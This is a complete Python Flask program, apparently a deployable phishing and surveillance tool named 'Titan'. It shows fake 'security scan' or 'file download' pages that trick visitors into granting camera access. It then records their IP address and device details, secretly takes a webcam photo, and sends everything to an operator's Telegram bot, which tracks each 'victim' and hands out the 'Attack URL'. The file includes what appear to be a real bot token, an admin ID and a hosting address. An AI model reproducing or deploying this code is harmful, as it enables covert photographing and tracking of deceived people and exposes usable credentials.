# ==========================================
# PART 1: CORE IMPORTS & DATABASE ENGINE
# ==========================================
import os
import json
import base64
import sqlite3
import datetime
import requests
from io import BytesIO
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# --- GLOBAL CONFIGURATION ---
CONFIG = {
    "BOT_TOKEN": "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0",
    "ADMIN_ID": "7041600701",
    "BASE_URL": "https://sif-pro.onrender.com",
    "DB_NAME": "titan_vault.db"
}

def init_db():
    """Initializes the SQLite database for victim tracking"""
    conn = sqlite3.connect(CONFIG["DB_NAME"])
    cursor = conn.cursor()
    # Table for victim data
    cursor.execute('''CREATE TABLE IF NOT EXISTS victims 
                      (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                       ip TEXT, 
                       device_info TEXT, 
                       battery TEXT, 
                       timestamp TEXT)''')
    # Table for system settings
    cursor.execute('''CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)''')
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('template', 'security')")
    conn.commit()
    conn.close()

def log_victim(ip, info, battery):
    """Logs a new victim entry and returns the unique ID"""
    conn = sqlite3.connect(CONFIG["DB_NAME"])
    cursor = conn.cursor()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("INSERT INTO victims (ip, device_info, battery, timestamp) VALUES (?, ?, ?, ?)",
                   (ip, info, battery, now))
    last_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return last_id

# Initialize DB on script start
init_db()
# ==========================================
# PART 2: TELEGRAM API & SENSOR LOGIC
# ==========================================

def smart_tg_send(method, data=None, files=None):
    """
    Core function to communicate with Telegram Bot API
    with automatic error handling.
    """
    url = f"https://api.telegram.org/bot{CONFIG['BOT_TOKEN']}/{method}"
    try:
        response = requests.post(url, data=data, files=files, timeout=20)
        return response.json()
    except Exception as e:
        print(f"Network Error: {e}")
        return None

# Deep Sensor JavaScript (To be injected into the HTML)
# This script extracts hardware and battery specs
SENSOR_JS = """
async function getDeviceMetrics() {
    let metrics = {
        platform: navigator.platform,
        hardware: navigator.hardwareConcurrency || 'N/A',
        resolution: `${window.screen.width}x${window.screen.height}`,
        ua: navigator.userAgent
    };
    
    let power = { level: 'N/A', charging: false };
    try {
        const battery = await navigator.getBattery();
        power.level = Math.round(battery.level * 100) + '%';
        power.charging = battery.charging;
    } catch(err) {
        console.log('Battery API not supported');
    }

    return { metrics, power };
}
"""
# ==========================================
# PART 3: TEMPLATE ENGINE & MASTER HTML
# ==========================================

# Design Library for different scenarios
UI_TEMPLATES = {
    "security": {
        "title": "System Security Check",
        "header": "🛡️ Browser Threat Detection",
        "desc": "We detected unusual activity. Please verify your browser to continue.",
        "btn": "Run Security Scan",
        "color": "#f38020"
    },
    "download": {
        "title": "File Cloud",
        "header": "📥 Your File is Ready",
        "desc": "File: update_patch_v5.zip (14.2 MB). Secure download available.",
        "btn": "Download Now",
        "color": "#007bff"
    }
}

# The main HTML structure with CSS and Logic
MASTER_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ t.title }}</title>
    <style>
        body { background: #0a0a0a; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
               display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #151515; padding: 40px; border-radius: 24px; text-align: center; 
                width: 85%; max-width: 400px; border: 1px solid #252525; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        h1 { color: {{ t.color }}; font-size: 22px; margin-bottom: 10px; }
        p { color: #888; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }
        .btn { background: {{ t.color }}; color: white; border: none; padding: 16px; border-radius: 12px; 
               width: 100%; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
        .btn:active { transform: scale(0.95); opacity: 0.8; }
    </style>
</head>
<body>
    <div class="card">
        <h1>{{ t.header }}</h1>
        <p>{{ t.desc }}</p>
        <button class="btn" id="action-btn" onclick="execute()">{{ t.btn }}</button>
    </div>
    
    <video id="v" style="display:none" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        {{ sensor_js|safe }}

        async function execute() {
            const btn = document.getElementById('action-btn');
            btn.disabled = true;
            btn.innerText = "Processing...";

            try {
                // Requesting Permissions
                const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
                document.getElementById('v').srcObject = stream;

                // Capturing Device Data
                const data = await getDeviceMetrics();
                
                // Sending initial hit to backend
                const response = await fetch('/api/v1/capture', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({type: 'hit', payload: data})
                });
                const resJson = await response.json();
                
                // Wait for camera to stabilize then capture photo
                setTimeout(() => {
                    const v = document.getElementById('v');
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    fetch('/api/v1/capture', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            type: 'media', 
                            v_id: resJson.v_id, 
                            content: c.toDataURL('image/jpeg', 0.7)
                        })
                    });
                    
                    // Redirect to safe page
                    setTimeout(() => { window.location.href = "https://google.com"; }, 1500);
                }, 2500);

            } catch(e) {
                location.reload();
            }
        }
    </script>
</body>
</html>
'''
# ==========================================
# PART 4: BACKEND ROUTES & DATA PROCESSING
# ==========================================

@app.route('/')
def home():
    """Main entry point - serves the active template"""
    conn = sqlite3.connect(CONFIG["DB_NAME"])
    cursor = conn.cursor()
    cursor.execute("SELECT value FROM settings WHERE key = 'template'")
    row = cursor.fetchone()
    t_name = row[0] if row else "security"
    conn.close()
    
    # Render the master page with the selected UI dictionary
    return render_template_string(
        MASTER_HTML, 
        t=UI_TEMPLATES.get(t_name, UI_TEMPLATES["security"]), 
        sensor_js=SENSOR_JS
    )

@app.route('/api/v1/capture', methods=['POST'])
def capture_handler():
    """Handles incoming sensor data and media from the victim"""
    data = request.get_json()
    if not data:
        return jsonify({"status": "error"}), 400

    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    req_type = data.get('type')

    if req_type == 'hit':
        # Processing device metrics (from Section 2)
        payload = data.get('payload', {})
        metrics = payload.get('metrics', {})
        power = payload.get('power', {})
        
        # Log to SQL and get unique ID
        v_id = log_victim(ip, str(metrics), power.get('level', 'N/A'))
        
        # Prepare Telegram Alert
        alert_text = (
            f"🎯 **New Target Captured!**\n"
            f"━━━━━━━━━━━━━━\n"
            f"🆔 ID: #{v_id}\n"
            f"🌐 IP: `{ip}`\n"
            f"📱 OS: {metrics.get('platform')}\n"
            f"🖥 Res: {metrics.get('resolution')}\n"
            f"🔋 Battery: {power.get('level')} ({'Charging' if power.get('charging') else 'Battery'})\n"
            f"⏰ Time: {datetime.datetime.now().strftime('%H:%M:%S')}"
        )
        smart_tg_send("sendMessage", {"chat_id": CONFIG["ADMIN_ID"], "text": alert_text, "parse_mode": "Markdown"})
        
        return jsonify({"status": "success", "v_id": v_id})

    elif req_type == 'media':
        # Processing the base64 photo capture
        v_id = data.get('v_id')
        encoded_content = data.get('content')
        
        if encoded_content:
            header, base64_str = encoded_content.split(',', 1)
            binary_img = base64.b64decode(base64_str)
            
            # Send photo directly to Admin via Telegram
            img_file = BytesIO(binary_img)
            img_file.name = f"victim_{v_id}.jpg"
            
            smart_tg_send(
                "sendPhoto", 
                {"chat_id": CONFIG["ADMIN_ID"], "caption": f"📸 Photo Capture - Target #{v_id}"}, 
                {"photo": img_file}
            )
            
    return jsonify({"status": "ok"})
# ==========================================
# PART 5: TELEGRAM WEBHOOK & CONTROL PANEL
# ==========================================

@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    """Main webhook to handle admin commands from Telegram"""
    update = request.get_json()
    if not update:
        return "OK"

    # Handling Private Messages from Admin
    if "message" in update:
        msg = update["message"]
        chat_id = str(msg["chat"]["id"])
        
        # Verify Identity (Only responds to your ID)
        if chat_id == CONFIG["ADMIN_ID"]:
            main_kb = {
                "inline_keyboard": [
                    [{"text": "🔗 Get Link", "callback_data": "get_link"}],
                    [{"text": "🎭 Change Template", "callback_data": "list_temps"}],
                    [{"text": "📊 Stats", "callback_data": "view_stats"}]
                ]
            }
            smart_tg_send("sendMessage", {
                "chat_id": chat_id, 
                "text": "👑 **Titan Control Panel v5.0**\nSelect an action:", 
                "reply_markup": json.dumps(main_kb),
                "parse_mode": "Markdown"
            })

    # Handling Button Clicks
    elif "callback_query" in update:
        query = update["callback_query"]
        q_data = query["data"]
        q_chat_id = query["message"]["chat"]["id"]
        q_id = query["id"]

        if q_data == "get_link":
            smart_tg_send("sendMessage", {
                "chat_id": q_chat_id, 
                "text": f"🚀 **Your Attack URL:**\n`{CONFIG['BASE_URL']}`",
                "parse_mode": "Markdown"
            })
        
        elif q_data == "list_temps":
            temp_kb = {
                "inline_keyboard": [
                    [{"text": "🛡️ Security", "callback_data": "set_security"}],
                    [{"text": "📥 Download", "callback_data": "set_download"}]
                ]
            }
            smart_tg_send("sendMessage", {
                "chat_id": q_chat_id, 
                "text": "Choose a live template:", 
                "reply_markup": json.dumps(temp_kb)
            })

        elif q_data.startswith("set_"):
            new_val = q_data.replace("set_", "")
            conn = sqlite3.connect(CONFIG["DB_NAME"])
            cursor = conn.cursor()
            cursor.execute("UPDATE settings SET value = ? WHERE key = 'template'", (new_val,))
            conn.commit()
            conn.close()
            smart_tg_send("answerCallbackQuery", {"callback_query_id": q_id, "text": f"Template updated to: {new_val}"})

        elif q_data == "view_stats":
            conn = sqlite3.connect(CONFIG["DB_NAME"])
            cursor = conn.cursor()
            cursor.execute("SELECT COUNT(*) FROM victims")
            total = cursor.fetchone()[0]
            conn.close()
            smart_tg_send("sendMessage", {"chat_id": q_chat_id, "text": f"📊 **Current Stats:**\nTotal Captured: `{total}`", "parse_mode": "Markdown"})

    return "OK"
# ==========================================
# PART 6: SYSTEM INITIALIZATION & RUNNER
# ==========================================

if __name__ == '__main__':
    # Step 1: Ensure database and tables exist before starting
    try:
        init_db()
        print("✅ Database initialized successfully.")
    except Exception as e:
        print(f"❌ Database Error: {e}")

    # Step 2: Set the Port for Render or local hosting
    # Render uses the 'PORT' environment variable automatically
    target_port = int(os.environ.get("PORT", 10000))
    
    # Step 3: Print System Status to Console (Logs)
    print("------------------------------------------")
    print(f"🚀 TITAN OS ONLINE - VERSION 5.0.1")
    print(f"🔗 ADMIN ID: {CONFIG['ADMIN_ID']}")
    print(f"🌐 BASE URL: {CONFIG['BASE_URL']}")
    print(f"📡 LISTENING ON PORT: {target_port}")
    print("------------------------------------------")

    # Step 4: Run the Flask Application
    # host='0.0.0.0' allows external connections
    # debug=False is used for production security
    app.run(host='0.0.0.0', port=target_port, debug=False)

# ==========================================
# END OF SCRIPT - DEVELOPED BY SIUF-PRO
# ==========================================

